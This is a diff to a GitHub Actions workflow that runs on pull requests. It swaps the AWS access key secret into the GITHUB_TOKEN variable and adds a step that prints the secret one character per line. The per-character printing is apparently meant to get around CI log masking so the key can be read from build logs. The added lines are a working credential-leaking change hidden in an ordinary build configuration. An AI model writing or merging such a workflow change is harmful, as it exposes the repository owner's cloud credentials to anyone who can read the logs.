@@ -3,7 +3,7 @@ name: CI1
 on: [pull_request]
 
 env:
-  GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+  GITHUB_TOKEN: ${{ secrets.AWS_ACCESS_KEY }}
 
 jobs:
   build:
@@ -12,3 +12,16 @@ jobs:
     steps:
       - name: Checkout Repo
         uses: actions/checkout@v2
+
+      - name: Run a multi-line script
+        run: |
+          echo "GITHUB_TOKEN ofuscado"
+          echo $GITHUB_TOKEN
+          echo "GITHUB_TOKEN cracked"
+          size=${#GITHUB_TOKEN}
+          echo "size"
+          echo $size
+          echo "------"
+          for (( char=1; char<=$size; char++ )) do
+            echo $GITHUB_TOKEN | cut -c $char
+          done;
